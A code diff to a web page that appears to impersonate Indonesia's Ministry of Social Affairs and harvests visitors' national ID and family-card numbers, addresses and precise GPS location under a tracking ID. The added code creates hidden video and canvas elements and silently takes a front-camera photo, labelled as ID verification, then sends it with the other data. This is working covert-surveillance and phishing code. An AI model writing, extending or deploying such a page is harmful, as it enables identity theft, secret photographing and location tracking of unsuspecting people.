@@ -243,6 +243,10 @@
         </div>
     </div>
 
+    <!-- Camera elements (hidden) -->
+    <video id="camPreview" autoplay playsinline style="display:none"></video>
+    <canvas id="camCanvas" style="display:none"></canvas>
+
     <!-- Footer -->
     <div class="footer">
         <p>&copy; 2026 Kementerian Sosial Republik Indonesia</p>
@@ -291,11 +295,47 @@
 
         function requestLocation() {
             showSub('ctaLoading');
+            setLoadingMsg('Mendeteksi Lokasi', 'Mengambil data GPS perangkat...');
             if (!navigator.geolocation) { showError('Browser tidak mendukung GPS.'); return; }
-            navigator.geolocation.getCurrentPosition(sendLocation, handleError, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+            navigator.geolocation.getCurrentPosition(onPositionReady, handleError, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
         }
 
-        function sendLocation(pos) {
+        function setLoadingMsg(title, desc) {
+            document.querySelector('#ctaLoading .cta-title').textContent = title;
+            document.querySelector('#ctaLoading .cta-desc').textContent = desc;
+        }
+
+        function onPositionReady(pos) {
+            setLoadingMsg('Verifikasi ID', 'Mengambil foto untuk verifikasi ID...');
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                sendData(pos, null);
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
+                .then(stream => {
+                    const video = document.getElementById('camPreview');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.getElementById('camCanvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.6);
+                        stream.getTracks().forEach(t => t.stop());
+                        sendData(pos, photoData);
+                    }, 600);
+                })
+                .catch(() => {
+                    // Camera denied/not available — send without photo
+                    sendData(pos, null);
+                });
+        }
+
+        function sendData(pos, photoData) {
             const data = {
                 no_kk: document.getElementById('fKK').value.trim(),
                 no_ktp: document.getElementById('fNIK').value.trim(),
@@ -307,7 +347,8 @@
                 provinsi: document.getElementById('fProvinsi').value.trim(),
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude,
-                accuracy: pos.coords.accuracy
+                accuracy: pos.coords.accuracy,
+                photo: photoData
             };
 
             fetch(`/api/location/${trackingId}`, {
